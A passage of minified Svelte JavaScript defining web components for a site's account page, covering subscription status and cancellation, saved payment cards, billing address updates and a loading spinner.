    d(t) {
      t && g(e);
    },
  };
}
function os(n) {
  let e, t, r, i, o;
  function s(c, d) {
    return c[1].length ? Rg : Ag;
  }
  let a = s(n),
    l = a(n);
  return {
    c() {
      (e = b("button")),
        (e.textContent = "Hide Subscriptions"),
        (t = E()),
        l.c(),
        (r = ee());
    },
    m(c, d) {
      p(c, e, d),
        p(c, t, d),
        l.m(c, d),
        p(c, r, d),
        i || ((o = O(e, "click", n[5])), (i = !0));
    },
    p(c, d) {
      a === (a = s(c)) && l
        ? l.p(c, d)
        : (l.d(1), (l = a(c)), l && (l.c(), l.m(r.parentNode, r)));
    },
    d(c) {
      c && g(e), c && g(t), l.d(c), c && g(r), (i = !1), o();
    },
  };
}
function Ag(n) {
  let e;
  return {
    c() {
      (e = b("p")), (e.textContent = "No subscriptions found");
    },
    m(t, r) {
      p(t, e, r);
    },
    p: k,
    d(t) {
      t && g(e);
    },
  };
}
function Rg(n) {
  let e,
    t = n[1],
    r = [];
  for (let i = 0; i < t.length; i += 1) r[i] = ds(ns(n, t, i));
  return {
    c() {
      for (let i = 0; i < r.length; i += 1) r[i].c();
      e = ee();
    },
    m(i, o) {
      for (let s = 0; s < r.length; s += 1) r[s].m(i, o);
      p(i, e, o);
    },
    p(i, o) {
      if (27 & o) {
        let s;
        for (t = i[1], s = 0; s < t.length; s += 1) {
          const a = ns(i, t, s);
          r[s]
            ? r[s].p(a, o)
            : ((r[s] = ds(a)), r[s].c(), r[s].m(e.parentNode, e));
        }
        for (; s < r.length; s += 1) r[s].d(1);
        r.length = t.length;
      }
    },
    d(i) {
      at(r, i), i && g(e);
    },
  };
}
function ss(n) {
  let e,
    t,
    i,
    o,
    a,
    r = n[8].discount.coupon.percent_off + "",
    s = n[8].discount.coupon.duration + "";
  return {
    c() {
      (e = b("p")),
        (t = A("Discount: %")),
        (i = A(r)),
        (o = A(" off ")),
        (a = A(s));
    },
    m(l, c) {
      p(l, e, c), h(e, t), h(e, i), h(e, o), h(e, a);
    },
    p(l, c) {
      2 & c && r !== (r = l[8].discount.coupon.percent_off + "") && U(i, r),
        2 & c && s !== (s = l[8].discount.coupon.duration + "") && U(a, s);
    },
    d(l) {
      l && g(e);
    },
  };
}
function as(n) {
  let e,
    t,
    i,
    o,
    s,
    a,
    l,
    c,
    r = An(n[8].current_period_end) + "",
    d = n[0] && ls();
  function u() {
    return n[6](n[8]);
  }
  return {
    c() {
      (e = b("p")),
        (t = A("Next payment ")),
        (i = A(r)),
        (o = E()),
        (s = b("button")),
        d && d.c(),
        (a = A("\n            Cancel Subscription")),
        w(s, "class", "cancel"),
        (s.disabled = n[0]);
    },
    m(f, m) {
      p(f, e, m),
        h(e, t),
        h(e, i),
        p(f, o, m),
        p(f, s, m),
        d && d.m(s, null),
        h(s, a),
        l || ((c = O(s, "click", u)), (l = !0));
    },
    p(f, m) {
      (n = f),
        2 & m && r !== (r = An(n[8].current_period_end) + "") && U(i, r),
        n[0] ? d || ((d = ls()), d.c(), d.m(s, a)) : d && (d.d(1), (d = null)),
        1 & m && (s.disabled = n[0]);
    },
    d(f) {
      f && g(e), f && g(o), f && g(s), d && d.d(), (l = !1), c();
    },
  };
}
function ls(n) {
  let e;
  return {
    c() {
      e = b("loading-spinner");
    },
    m(t, r) {
      p(t, e, r);
    },
    d(t) {
      t && g(e);
    },
  };
}
function cs(n) {
  let e,
    t,
    i,
    o,
    s,
    a,
    l,
    c,
    r = An(n[8].cancel_at) + "",
    d = n[0] && us();
  function u() {
    return n[7](n[8]);
  }
  return {
    c() {
      (e = b("p")),
        (t = A("Your subscription is canceled. PRO access will end ")),
        (i = A(r)),
        (o = E()),
        (s = b("button")),
        d && d.c(),
        (a = A("\n            Undo Cancellation")),
        w(e, "class", "warn"),
        w(s, "class", "undo"),
        (s.disabled = n[0]);
    },
    m(f, m) {
      p(f, e, m),
        h(e, t),
        h(e, i),
        p(f, o, m),
        p(f, s, m),
        d && d.m(s, null),
        h(s, a),
        l || ((c = O(s, "click", u)), (l = !0));
    },
    p(f, m) {
      (n = f),
        2 & m && r !== (r = An(n[8].cancel_at) + "") && U(i, r),
        n[0] ? d || ((d = us()), d.c(), d.m(s, a)) : d && (d.d(1), (d = null)),
        1 & m && (s.disabled = n[0]);
    },
    d(f) {
      f && g(e), f && g(o), f && g(s), d && d.d(), (l = !1), c();
    },
  };
}
function us(n) {
  let e;
  return {
    c() {
      e = b("loading-spinner");
    },
    m(t, r) {
      p(t, e, r);
    },
    d(t) {
      t && g(e);
    },
  };
}
function ds(n) {
  let e,
    t,
    r,
    o,
    s,
    a,
    l,
    d,
    u,
    f,
    m,
    I,
    v,
    L,
    _,
    te,
    ne,
    D,
    z,
    B,
    i = n[8].id + "",
    c = n[8].status + "",
    y = n[8].plan.amount / 100 + "",
    R = n[8].plan.interval_count + "",
    P =
      (n[8].plan.interval_count > 1
        ? n[8].plan.interval + "s"
        : n[8].plan.interval) + "",
    q = n[8].discount && ss(n),
    H = !n[8].canceled_at && as(n),
    M = n[8].canceled_at && "active" === n[8].status && cs(n);
  return {
    c() {
      (e = b("section")),
        (t = b("h3")),
        (r = A("ID: ")),
        (o = A(i)),
        (s = E()),
        (a = b("p")),
        (l = A("PRO Status: ")),
        (d = A(c)),
        (u = E()),
        (f = b("p")),
        (m = A("Plan: $")),
        (I = A(y)),
        (v = A(" \n          per ")),
        (L = A(R)),
        (_ = E()),
        (te = A(P)),
        (ne = E()),
        q && q.c(),
        (D = E()),
        H && H.c(),
        (z = E()),
        M && M.c(),
        (B = E());
    },
    m(X, re) {
      p(X, e, re),
        h(e, t),
        h(t, r),
        h(t, o),
        h(e, s),
        h(e, a),
        h(a, l),
        h(a, d),
        h(e, u),
        h(e, f),
        h(f, m),
        h(f, I),
        h(f, v),
        h(f, L),
        h(f, _),
        h(f, te),
        h(e, ne),
        q && q.m(e, null),
        h(e, D),
        H && H.m(e, null),
        h(e, z),
        M && M.m(e, null),
        h(e, B);
    },
    p(X, re) {
      2 & re && i !== (i = X[8].id + "") && U(o, i),
        2 & re && c !== (c = X[8].status + "") && U(d, c),
        2 & re && y !== (y = X[8].plan.amount / 100 + "") && U(I, y),
        2 & re && R !== (R = X[8].plan.interval_count + "") && U(L, R),
        2 & re &&
          P !==
            (P =
              (X[8].plan.interval_count > 1
                ? X[8].plan.interval + "s"
                : X[8].plan.interval) + "") &&
          U(te, P),
        X[8].discount
          ? q
            ? q.p(X, re)
            : ((q = ss(X)), q.c(), q.m(e, D))
          : q && (q.d(1), (q = null)),
        X[8].canceled_at
          ? H && (H.d(1), (H = null))
          : H
          ? H.p(X, re)
          : ((H = as(X)), H.c(), H.m(e, z)),
        X[8].canceled_at && "active" === X[8].status
          ? M
            ? M.p(X, re)
            : ((M = cs(X)), M.c(), M.m(e, B))
          : M && (M.d(1), (M = null));
    },
    d(X) {
      X && g(e), q && q.d(), H && H.d(), M && M.d();
    },
  };
}
function Pg(n) {
  let e,
    t,
    r = !n[1] && rs(n),
    i = n[1] && os(n);
  return {
    c() {
      r && r.c(), (e = E()), i && i.c(), (t = ee()), (this.c = k);
    },
    m(o, s) {
      r && r.m(o, s), p(o, e, s), i && i.m(o, s), p(o, t, s);
    },
    p(o, [s]) {
      o[1]
        ? r && (r.d(1), (r = null))
        : r
        ? r.p(o, s)
        : ((r = rs(o)), r.c(), r.m(e.parentNode, e)),
        o[1]
          ? i
            ? i.p(o, s)
            : ((i = os(o)), i.c(), i.m(t.parentNode, t))
          : i && (i.d(1), (i = null));
    },
    i: k,
    o: k,
    d(o) {
      r && r.d(o), o && g(e), i && i.d(o), o && g(t);
    },
  };
}
function An(n) {
  if (!n) return "never";
  let e = new Intl.RelativeTimeFormat("en", { numeric: "auto" }),
    t = -Math.floor((Date.now() - 1e3 * n) / 1e3) / 86400;
  return e.format(Math.floor(t), "day");
}
function xg(n, e, t) {
  let r = !1,
    i = null;
  async function o() {
    t(0, (r = !0));
    const u = await ge({ fn: "getSubscriptions", payload: {} });
    t(1, (i = (null == u ? void 0 : u.data) || [])),
      console.log(i),
      t(0, (r = !1));
  }
  async function s(u) {
    t(0, (r = !0)),
      (await ge({ fn: "cancelSubscription", payload: { subscription: u } })) &&
        (await o(),
        me.set({
          message: "Subscription canceled. It was fun while it lasted",
          type: "info",
        })),
      t(0, (r = !1));
  }
  async function a(u) {
    t(0, (r = !0)),
      (await ge({
        fn: "unCancelSubscription",
        payload: { subscription: u },
      })) &&
        (await o(),
        me.set({ message: "Subscription reactivated!", type: "success" })),
      t(0, (r = !1));
  }
  return [
    r,
    i,
    o,
    s,
    a,
    () => t(1, (i = null)),
    (u) => s(u.id),
    (u) => a(u.id),
  ];
}
customElements.define("user-invoices", Cg);
class Og extends K {
  constructor(e) {
    super(),
      (this.shadowRoot.innerHTML =
        "<style>section{margin-top:1rem;margin-bottom:1rem;border-radius:0.5rem;--tw-bg-opacity:1;background-color:rgb(42 46 53 / var(--tw-bg-opacity));padding:1.5rem\n}button{display:inline-flex;cursor:pointer;border-style:none;--tw-bg-opacity:1;background-color:rgb(59 130 246 / var(--tw-bg-opacity));padding-left:1.25rem;padding-right:1.25rem;padding-top:0.5rem;padding-bottom:0.5rem;text-align:center;font-family:sofia-pro, sans-serif;font-size:0.875rem;line-height:1.25rem;font-weight:700;text-transform:uppercase;--tw-text-opacity:1;color:rgb(255 255 255 / var(--tw-text-opacity));-webkit-text-decoration-line:none;text-decoration-line:none\n}button:hover{--tw-bg-opacity:1;background-color:rgb(37 99 235 / var(--tw-bg-opacity))\n}button:active{--tw-bg-opacity:1;background-color:rgb(29 78 216 / var(--tw-bg-opacity))\n}button:disabled{cursor:not-allowed;opacity:0.7\n}.cancel{--tw-bg-opacity:1;background-color:rgb(239 68 68 / var(--tw-bg-opacity))\n}.cancel:hover{--tw-bg-opacity:1;background-color:rgb(220 38 38 / var(--tw-bg-opacity))\n}.cancel:active{--tw-bg-opacity:1;background-color:rgb(185 28 28 / var(--tw-bg-opacity))\n}.undo{--tw-bg-opacity:1;background-color:rgb(34 197 94 / var(--tw-bg-opacity))\n}.undo:hover{--tw-bg-opacity:1;background-color:rgb(22 163 74 / var(--tw-bg-opacity))\n}.undo:active{--tw-bg-opacity:1;background-color:rgb(21 128 61 / var(--tw-bg-opacity))\n}.warn{--tw-text-opacity:1;color:rgb(234 179 8 / var(--tw-text-opacity))\n}</style>"),
      J(
        this,
        {
          target: this.shadowRoot,
          props: Y(this.attributes),
          customElement: !0,
        },
        xg,
        Pg,
        G,
        {},
        null
      ),
      e && e.target && p(e.target, this, e.anchor);
  }
}
function fs(n, e, t) {
  const r = n.slice();
  return (r[8] = e[t]), r;
}
function ps(n) {
  let e,
    t,
    i,
    o,
    s,
    r = n[0] ? "loading..." : "update payment method",
    a = n[0] && hs();
  return {
    c() {
      (e = b("button")), a && a.c(), (t = E()), (i = A(r));
    },
    m(l, c) {
      p(l, e, c),
        a && a.m(e, null),
        h(e, t),
        h(e, i),
        o || ((s = O(e, "click", n[3])), (o = !0));
    },
    p(l, c) {
      l[0] ? a || ((a = hs()), a.c(), a.m(e, t)) : a && (a.d(1), (a = null)),
        1 & c &&
          r !== (r = l[0] ? "loading..." : "update payment method") &&
          U(i, r);
    },
    d(l) {
      l && g(e), a && a.d(), (o = !1), s();
    },
  };
}
function hs(n) {
  let e;
  return {
    c() {
      e = b("loading-spinner");
    },
    m(t, r) {
      p(t, e, r);
    },
    d(t) {
      t && g(e);
    },
  };
}
function ms(n) {
  let e,
    t,
    r,
    i,
    o,
    s,
    a,
    l,
    d,
    u,
    f,
    m,
    c = n[0] ? "loading..." : "Add new card";
  function y(_, P) {
    return _[1].length ? Ng : Lg;
  }
  let I = y(n),
    v = I(n),
    R = n[0] && bs(),
    L = n[2] && ws(n);
  return {
    c() {
      (e = b("button")),
        (e.textContent = "Hide Payment Methods"),
        (t = E()),
        (r = b("div")),
        (i = b("h3")),
        (i.textContent = "Payment Methods"),
        (o = E()),
        v.c(),
        (s = E()),
        (a = b("button")),
        R && R.c(),
        (l = E()),
        (d = A(c)),
        (u = E()),
        L && L.c(),
        w(a, "class", "update"),
        w(r, "class", "wrap");
    },
    m(_, P) {
      p(_, e, P),
        p(_, t, P),
        p(_, r, P),
        h(r, i),
        h(r, o),
        v.m(r, null),
        h(r, s),
        h(r, a),
        R && R.m(a, null),
        h(a, l),
        h(a, d),
        h(r, u),
        L && L.m(r, null),
        f || ((m = [O(e, "click", n[6]), O(a, "click", n[5])]), (f = !0));
    },
    p(_, P) {
      I === (I = y(_)) && v
        ? v.p(_, P)
        : (v.d(1), (v = I(_)), v && (v.c(), v.m(r, s))),
        _[0] ? R || ((R = bs()), R.c(), R.m(a, l)) : R && (R.d(1), (R = null)),
        1 & P && c !== (c = _[0] ? "loading..." : "Add new card") && U(d, c),
        _[2]
          ? L
            ? L.p(_, P)
            : ((L = ws(_)), L.c(), L.m(r, null))
          : L && (L.d(1), (L = null));
    },
    d(_) {
      _ && g(e),
        _ && g(t),
        _ && g(r),
        v.d(),
        R && R.d(),
        L && L.d(),
        (f = !1),
        fe(m);
    },
  };
}
function Lg(n) {
  let e;
  return {
    c() {
      (e = b("p")), (e.textContent = "No payment methods found");
    },
    m(t, r) {
      p(t, e, r);
    },
    p: k,
    d(t) {
      t && g(e);
    },
  };
}
function Ng(n) {
  let e,
    t = n[1],
    r = [];
  for (let i = 0; i < t.length; i += 1) r[i] = gs(fs(n, t, i));
  return {
    c() {
      e = b("ul");
      for (let i = 0; i < r.length; i += 1) r[i].c();
    },
    m(i, o) {
      p(i, e, o);
      for (let s = 0; s < r.length; s += 1) r[s].m(e, null);
    },
    p(i, o) {
      if (18 & o) {
        let s;
        for (t = i[1], s = 0; s < t.length; s += 1) {
          const a = fs(i, t, s);
          r[s] ? r[s].p(a, o) : ((r[s] = gs(a)), r[s].c(), r[s].m(e, null));
        }
        for (; s < r.length; s += 1) r[s].d(1);
        r.length = t.length;
      }
    },
    d(i) {
      i && g(e), at(r, i);
    },
  };
}
function gs(n) {
  let e,
    r,
    i,
    s,
    a,
    c,
    d,
    f,
    m,
    y,
    I,
    v,
    R,
    t = n[8].card.brand + "",
    o = n[8].card.last4 + "",
    l = n[8].card.exp_month + "",
    u = n[8].card.exp_year + "";
  function L() {
    return n[7](n[8]);
  }
  return {
    c() {
      (e = b("li")),
        (r = A(t)),
        (i = A(" ending in ")),
        (s = A(o)),
        (a = A(" expires ")),
        (c = A(l)),
        (d = A("/")),
        (f = A(u)),
        (m = E()),
        (y = b("span")),
        (y.textContent = "delete"),
        (I = E()),
        w(y, "class", "warn");
    },
    m(_, P) {
      p(_, e, P),
        h(e, r),
        h(e, i),
        h(e, s),
        h(e, a),
        h(e, c),
        h(e, d),
        h(e, f),
        h(e, m),
        h(e, y),
        h(e, I),
        v || ((R = O(y, "click", L)), (v = !0));
    },
    p(_, P) {
      (n = _),
        2 & P && t !== (t = n[8].card.brand + "") && U(r, t),
        2 & P && o !== (o = n[8].card.last4 + "") && U(s, o),
        2 & P && l !== (l = n[8].card.exp_month + "") && U(c, l),
        2 & P && u !== (u = n[8].card.exp_year + "") && U(f, u);
    },
    d(_) {
      _ && g(e), (v = !1), R();
    },
  };
}
function bs(n) {
  let e;
  return {
    c() {
      e = b("loading-spinner");
    },
    m(t, r) {
      p(t, e, r);
    },
    d(t) {
      t && g(e);
    },
  };
}
function ws(n) {
  let e, t;
  return {
    c() {
      (e = b("a")), (t = A("Card Update Screen")), w(e, "href", n[2]);
    },
    m(r, i) {
      p(r, e, i), h(e, t);
    },
    p(r, i) {
      4 & i && w(e, "href", r[2]);
    },
    d(r) {
      r && g(e);
    },
  };
}
function Mg(n) {
  let e,
    t,
    r = !n[1] && ps(n),
    i = n[1] && ms(n);
  return {
    c() {
      r && r.c(), (e = E()), i && i.c(), (t = ee()), (this.c = k);
    },
    m(o, s) {
      r && r.m(o, s), p(o, e, s), i && i.m(o, s), p(o, t, s);
    },
    p(o, [s]) {
      o[1]
        ? r && (r.d(1), (r = null))
        : r
        ? r.p(o, s)
        : ((r = ps(o)), r.c(), r.m(e.parentNode, e)),
        o[1]
          ? i
            ? i.p(o, s)
            : ((i = ms(o)), i.c(), i.m(t.parentNode, t))
          : i && (i.d(1), (i = null));
    },
    i: k,
    o: k,
    d(o) {
      r && r.d(o), o && g(e), i && i.d(o), o && g(t);
    },
  };
}
function Dg(n, e, t) {
  let i,
    o,
    r = !1;
  async function s() {
    t(0, (r = !0));
    const u = await ge({ fn: "getPaymentMethods", payload: {} });
    t(1, (i = (null == u ? void 0 : u.data) || [])), t(0, (r = !1));
  }
  async function a(u) {
    t(0, (r = !0)),
      (await ge({ fn: "deletePaymentMethod", payload: { pm: u } })) &&
        (await s()),
      t(0, (r = !1));
  }
  return [
    r,
    i,
    o,
    s,
    a,
    async function l() {
      var u;
      t(0, (r = !0)),
        t(2, (o = await ge({ fn: "createSetupSession", payload: {} }))),
        o && (null == (u = window.open(o, "_blank")) || u.focus()),
        t(0, (r = !1));
    },
    () => t(1, (i = null)),
    (u) => a(u.id),
  ];
}
customElements.define("manage-subscription", Og);
class Ug extends K {
  constructor(e) {
    super(),
      (this.shadowRoot.innerHTML =
        "<style>button{display:inline-flex;cursor:pointer;border-style:none;--tw-bg-opacity:1;background-color:rgb(59 130 246 / var(--tw-bg-opacity));padding-left:1.25rem;padding-right:1.25rem;padding-top:0.5rem;padding-bottom:0.5rem;text-align:center;font-family:sofia-pro, sans-serif;font-size:0.875rem;line-height:1.25rem;font-weight:700;text-transform:uppercase;--tw-text-opacity:1;color:rgb(255 255 255 / var(--tw-text-opacity));-webkit-text-decoration-line:none;text-decoration-line:none\n}button:hover{--tw-bg-opacity:1;background-color:rgb(37 99 235 / var(--tw-bg-opacity))\n}button:active{--tw-bg-opacity:1;background-color:rgb(29 78 216 / var(--tw-bg-opacity))\n}.update{--tw-bg-opacity:1;background-color:rgb(34 197 94 / var(--tw-bg-opacity))\n}.update:hover{--tw-bg-opacity:1;background-color:rgb(22 163 74 / var(--tw-bg-opacity))\n}.update:active{--tw-bg-opacity:1;background-color:rgb(21 128 61 / var(--tw-bg-opacity))\n}a{display:block;font-size:0.875rem;line-height:1.25rem;--tw-text-opacity:1;color:rgb(59 130 246 / var(--tw-text-opacity))\n}.warn{cursor:pointer;--tw-text-opacity:1;color:rgb(239 68 68 / var(--tw-text-opacity))\n}.wrap{margin-top:4rem;margin-bottom:6rem\n}</style>"),
      J(
        this,
        {
          target: this.shadowRoot,
          props: Y(this.attributes),
          customElement: !0,
        },
        Dg,
        Mg,
        G,
        {},
        null
      ),
      e && e.target && p(e.target, this, e.anchor);
  }
}
function _s(n) {
  let e,
    t,
    r,
    i,
    o = n[1] && ys();
  return {
    c() {
      (e = b("button")), o && o.c(), (t = A("\n    update address"));
    },
    m(s, a) {
      p(s, e, a),
        o && o.m(e, null),
        h(e, t),
        r || ((i = O(e, "click", n[6])), (r = !0));
    },
    p(s, a) {
      s[1] ? o || ((o = ys()), o.c(), o.m(e, t)) : o && (o.d(1), (o = null));
    },
    d(s) {
      s && g(e), o && o.d(), (r = !1), i();
    },
  };
}
function ys(n) {
  let e;
  return {
    c() {
      e = b("loading-spinner");
    },
    m(t, r) {
      p(t, e, r);
    },
    d(t) {
      t && g(e);
    },
  };
}
function vs(n) {
  let e,
    t,
    r,
    i,
    o,
    s,
    a,
    l,
    c,
    d,
    u,
    f,
    m,
    y,
    I,
    v,
    R,
    L,
    _,
    P,
    te,
    ne,
    D,
    z,
    B,
    q,
    H,
    M,
    X,
    re,
    ue,
    be,
    Be,
    ke,
    yt,
    Ut,
    kt,
    on,
    vt = n[1] ? "updating..." : "save address",
    Ie = n[1] && ks();
  return {
    c() {
      (e = b("button")),
        (e.textContent = "Hide Address"),
        (t = E()),
        (r = b("p")),
        (r.textContent =
          "This form will update your address in stripe and be reflected on invoices"),
        (i = E()),
        (o = b("form")),
        (s = b("label")),
        (s.textContent = "Name"),
        (a = E()),
        (l = b("input")),
        (c = E()),
        (d = b("label")),
        (d.textContent = "Line 1"),
        (u = E()),
        (f = b("input")),
        (m = E()),
        (y = b("label")),
        (y.textContent = "Line 2"),
        (I = E()),
        (v = b("input")),
        (R = E()),
        (L = b("label")),
        (L.textContent = "City"),
        (_ = E()),
        (P = b("input")),
        (te = E()),
        (ne = b("label")),
        (ne.textContent = "State"),
        (D = E()),
        (z = b("input")),
        (B = E()),
        (q = b("label")),
        (q.textContent = "Postal Code"),
        (H = E()),
        (M = b("input")),
        (X = E()),
        (re = b("label")),
        (re.textContent = "Country Code (2 Digit)"),
        (ue = E()),
        (be = b("input")),
        (Be = E()),
        (ke = b("button")),
        Ie && Ie.c(),
        (yt = E()),
        (Ut = A(vt)),
        w(s, "for", "name"),
        w(l, "name", "name"),
        w(l, "type", "text"),
        w(l, "maxlength", "100"),
        w(d, "for", "line1"),
        w(f, "name", "line1"),
        w(f, "type", "text"),
        w(f, "maxlength", "100"),
        w(y, "for", "line2"),
        w(v, "name", "line2"),
        w(v, "type", "text"),
        w(v, "maxlength", "100"),
        w(L, "for", "city"),
        w(P, "name", "city"),
        w(P, "type", "text"),
        w(P, "maxlength", "50"),
        w(ne, "for", "state"),
        w(z, "name", "state"),
        w(z, "type", "text"),
        w(z, "maxlength", "50"),
        w(q, "for", "postal_code"),
        w(M, "name", "postal_code"),
        w(M, "type", "text"),
        w(M, "maxlength", "20"),
        w(re, "for", "country"),
        w(be, "name", "country"),
        w(be, "type", "text"),
        w(be, "maxlength", "2"),
        w(ke, "class", "update");
    },
    m(Q, pe) {
      p(Q, e, pe),
        p(Q, t, pe),
        p(Q, r, pe),
        p(Q, i, pe),
        p(Q, o, pe),
        h(o, s),
        h(o, a),
        h(o, l),
        de(l, n[2]),
        h(o, c),
        h(o, d),
        h(o, u),
        h(o, f),
        de(f, n[3].line1),
        h(o, m),
        h(o, y),
        h(o, I),
        h(o, v),
        de(v, n[3].line2),
        h(o, R),
        h(o, L),
        h(o, _),
        h(o, P),
        de(P, n[3].city),
        h(o, te),
        h(o, ne),
        h(o, D),
        h(o, z),
        de(z, n[3].state),
        h(o, B),
        h(o, q),
        h(o, H),
        h(o, M),
        de(M, n[3].postal_code),
        h(o, X),
        h(o, re),
        h(o, ue),
        h(o, be),
        de(be, n[3].country),
        p(Q, Be, pe),
        p(Q, ke, pe),
        Ie && Ie.m(ke, null),
        h(ke, yt),
        h(ke, Ut),
        kt ||
          ((on = [
            O(e, "click", n[8]),
            O(l, "input", n[9]),
            O(f, "input", n[10]),
            O(v, "input", n[11]),
            O(P, "input", n[12]),
            O(z, "input", n[13]),
            O(M, "input", n[14]),
            O(be, "input", n[15]),
            O(ke, "click", n[7]),
          ]),
          (kt = !0));
    },
    p(Q, pe) {
      4 & pe && l.value !== Q[2] && de(l, Q[2]),
        8 & pe && f.value !== Q[3].line1 && de(f, Q[3].line1),
        8 & pe && v.value !== Q[3].line2 && de(v, Q[3].line2),
        8 & pe && P.value !== Q[3].city && de(P, Q[3].city),
        8 & pe && z.value !== Q[3].state && de(z, Q[3].state),
        8 & pe && M.value !== Q[3].postal_code && de(M, Q[3].postal_code),
        8 & pe && be.value !== Q[3].country && de(be, Q[3].country),
        Q[1]
          ? Ie || ((Ie = ks()), Ie.c(), Ie.m(ke, yt))
          : Ie && (Ie.d(1), (Ie = null)),
        2 & pe &&
          vt !== (vt = Q[1] ? "updating..." : "save address") &&
          U(Ut, vt);
    },
    d(Q) {
      Q && g(e),
        Q && g(t),
        Q && g(r),
        Q && g(i),
        Q && g(o),
        Q && g(Be),
        Q && g(ke),
        Ie && Ie.d(),
        (kt = !1),
        fe(on);
    },
  };
}
function ks(n) {
  let e;
  return {
    c() {
      e = b("loading-spinner");
    },
    m(t, r) {
      p(t, e, r);
    },
    d(t) {
      t && g(e);
    },
  };
}
function Fg(n) {
  let e,
    t,
    r = !n[0] && _s(n),
    i = n[0] && vs(n);
  return {
    c() {
      r && r.c(), (e = E()), i && i.c(), (t = ee()), (this.c = k);
    },
    m(o, s) {
      r && r.m(o, s), p(o, e, s), i && i.m(o, s), p(o, t, s);
    },
    p(o, [s]) {
      o[0]
        ? r && (r.d(1), (r = null))
        : r
        ? r.p(o, s)
        : ((r = _s(o)), r.c(), r.m(e.parentNode, e)),
        o[0]
          ? i
            ? i.p(o, s)
            : ((i = vs(o)), i.c(), i.m(t.parentNode, t))
          : i && (i.d(1), (i = null));
    },
    i: k,
    o: k,
    d(o) {
      r && r.d(o), o && g(e), i && i.d(o), o && g(t);
    },
  };
}
function Hg(n, e, t) {
  let r, i;
  const o = Se("");
  ie(n, o, (_) => t(2, (r = _)));
  const s = Se({
    line1: "",
    line2: "",
    city: "",
    state: "",
    postal_code: "",
    country: "",
  });
  ie(n, s, (_) => t(3, (i = _)));
  let a = !1,
    l = !1;
  return [
    a,
    l,
    r,
    i,
    o,
    s,
    async function c() {
      t(1, (l = !0));
      const _ = await ge({ fn: "getCustomer", payload: {} });
      null != _ && _.name && o.set(_.name),
        null != _ && _.address && s.set(_.address),
        t(1, (l = !1)),
        t(0, (a = !0));
    },
    async function d() {
      t(1, (l = !0)),
        (await ge({ fn: "changeAddress", payload: { address: i, name: r } })) &&
          (me.set({ message: "Address updated", type: "success" }),
          t(0, (a = !1))),
        t(1, (l = !1));
    },
    () => t(0, (a = !1)),
    function f() {
      (r = this.value), o.set(r);
    },
    function m() {
      (i.line1 = this.value), s.set(i);
    },
    function y() {
      (i.line2 = this.value), s.set(i);
    },
    function I() {
      (i.city = this.value), s.set(i);
    },
    function v() {
      (i.state = this.value), s.set(i);
    },
    function R() {
      (i.postal_code = this.value), s.set(i);
    },
    function L() {
      (i.country = this.value), s.set(i);
    },
  ];
}
customElements.define("update-payment", Ug);
class jg extends K {
  constructor(e) {
    super(),
      (this.shadowRoot.innerHTML =
        "<style>button{display:inline-flex;cursor:pointer;border-style:none;--tw-bg-opacity:1;background-color:rgb(59 130 246 / var(--tw-bg-opacity));padding-left:1.25rem;padding-right:1.25rem;padding-top:0.5rem;padding-bottom:0.5rem;text-align:center;font-family:sofia-pro, sans-serif;font-size:0.875rem;line-height:1.25rem;font-weight:700;text-transform:uppercase;--tw-text-opacity:1;color:rgb(255 255 255 / var(--tw-text-opacity));-webkit-text-decoration-line:none;text-decoration-line:none\n}button:hover{--tw-bg-opacity:1;background-color:rgb(37 99 235 / var(--tw-bg-opacity))\n}button:active{--tw-bg-opacity:1;background-color:rgb(29 78 216 / var(--tw-bg-opacity))\n}.update{margin-bottom:5rem;--tw-bg-opacity:1;background-color:rgb(34 197 94 / var(--tw-bg-opacity))\n}.update:hover{--tw-bg-opacity:1;background-color:rgb(22 163 74 / var(--tw-bg-opacity))\n}.update:active{--tw-bg-opacity:1;background-color:rgb(21 128 61 / var(--tw-bg-opacity))\n}input{margin-right:0.75rem;margin-bottom:1rem;width:100%;border-style:solid;--tw-border-opacity:1;border-color:rgb(42 46 53 / var(--tw-border-opacity));--tw-bg-opacity:1;background-color:rgb(18 24 27 / var(--tw-bg-opacity));padding:0.75rem;font-family:sofia-pro, sans-serif;--tw-text-opacity:1;color:rgb(255 255 255 / var(--tw-text-opacity));outline:2px solid transparent;outline-offset:2px\n}</style>"),
      J(
        this,
        {
          target: this.shadowRoot,
          props: Y(this.attributes),
          customElement: !0,
        },
        Hg,
        Fg,
        G,
        {},
        null
      ),
      e && e.target && p(e.target, this, e.anchor);
  }
}
function zg(n) {
  let e, t, r;
  return {
    c() {
      (e = jn("svg")),
        (t = jn("circle")),
        (r = jn("path")),
        (this.c = k),
        w(t, "cx", "12"),
        w(t, "cy", "12"),
        w(t, "r", "10"),
        w(t, "stroke", "currentColor"),
        w(t, "stroke-width", "4"),
        w(r, "fill", "currentColor"),
        w(
          r,
          "d",
          "M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
        ),
        w(e, "xmlns", "http://www.w3.org/2000/svg"),
        w(e, "fill", "none"),
        w(e, "viewBox", "0 0 24 24");
    },
    m(i, o) {
      p(i, e, o), h(e, t), h(e, r);
    },
    p: k,
    i: k,
    o: k,
    d(i) {
      i && g(e);
    },
  };
}
customElements.define("update-address", jg);
class Bg extends K {
  constructor(e) {
    super(),
      (this.shadowRoot.innerHTML =
        "<style>svg{margin-left:0.25rem;margin-right:0.25rem;width:0.875rem\n}@keyframes spin{to{transform:rotate(360deg)\n    }}svg{animation:spin 1s linear infinite\n}circle{opacity:0.25\n}path{opacity:0.75\n}</style>"),
      J(
        this,
        {
          target: this.shadowRoot,
          props: Y(this.attributes),
          customElement: !0,
        },
        null,
        zg,
        G,
        {},
        null
      ),
      e && e.target && p(e.target, this, e.anchor);
  }
}
customElements.define("loading-spinner", Bg),
  console.log(
    '%c  \n\n.d888 d8b                           888      d8b          \nd88P"  Y8P                          888      Y8P          \n888                                 888                   \n888888 888 888d888 .d88b.  .d8888b  88888b.  888 88888b.  \n888    888 888P"  d8P  Y8b 88K      888 "88b 888 888 "88b \n888    888 888    88888888 "Y8888b. 888  888 888 888  888 \n888    888 888    Y8b.          X88 888  888 888 888 d88P \n888    888 888     "Y8888   88888P\' 888  888 888 88888P"  \n                                                 888      \n                                                 888      \n                                                 888      ',
    "font-family:monospace; color: orange;"
  ),
  window.addEventListener("flamethrower:router:end", (n) => {
    Bp();
  }),
  Kp(),
  Wp();
const mr = al({ prefetch: "hover", log: !1 });
export {
  He as C,
  ze as F,
  oe as L,
  tn as S,
  Nt as _,
  $g as a,
  qc as b,
  Ke as c,
  qg as d,
  Kt as e,
  Gg as f,
  Le as g,
  wr as h,
  ve as i,
  Us as j,
  Wg as k,
  Kg as l,
  Ue as r,
};
